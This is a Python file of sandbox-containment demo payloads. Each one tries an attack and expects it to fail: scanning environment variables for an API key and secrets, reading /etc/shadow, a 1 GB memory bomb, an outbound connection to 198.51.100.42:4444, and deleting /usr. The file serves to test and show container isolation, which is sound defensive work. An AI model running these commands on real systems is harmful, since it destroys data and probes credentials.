"""Adversarial Payloads for the Challenge 1 'Containment Moment' Video Demo.

Each payload is executed inside the locked-down Docker sandbox to prove that:
1. Host API keys (VULTR_INFERENCE_API_KEY) do not exist inside the sandbox.
2. Memory bombs are terminated at 256 MB without affecting the Vultr host VM.
3. Reverse shells / metadata probes fail under --network none.
4. Root filesystem tampering fails under --read-only.
"""

CONTAINMENT_PAYLOADS = {
    "secrets": """
import os
print("[ATTACK] Attempting to exfiltrate VULTR_INFERENCE_API_KEY...")
leaked = [k for k in os.environ if k == "VULTR_INFERENCE_API_KEY" or "SECRET" in k]
print("Mounted secrets found:", leaked)
assert len(leaked) == 0, "CRITICAL: Secret leaked into sandbox!"
print("[ATTACK] Attempting to read /etc/shadow...")
try:
    open("/etc/shadow").read()
except PermissionError as e:
    print("[CONTAINED] Kernel blocked /etc/shadow access:", e)
""",
    "memory": """
import os
print("[ATTACK] Allocating 1GB bytearray inside 256MB-capped container...")
try:
    bomb = bytearray(1024 * 1024 * 1024)
except MemoryError as e:
    print("[CONTAINED] MemoryError caught at cgroup ceiling:", e)
""",
    "network": """
import socket
print("[ATTACK] Attempting outbound TCP connection to 198.51.100.42:4444...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.0)
    s.connect(("198.51.100.42", 4444))
except OSError as e:
    print("[CONTAINED] Network namespace (--network none) blocked socket:", e)
""",
    "filesystem": """
import shutil
print("[ATTACK] Attempting to delete /usr inside container...")
try:
    shutil.rmtree("/usr")
except OSError as e:
    print("[CONTAINED] Read-only rootfs blocked deletion:", e)
"""
}

if __name__ == "__main__":
    from sandbox_runner import execute_python_in_sandbox
    for name, code in CONTAINMENT_PAYLOADS.items():
        print(f"=== Running Containment Moment: {name.upper()} ===")
        res = execute_python_in_sandbox(code)
        print(res)
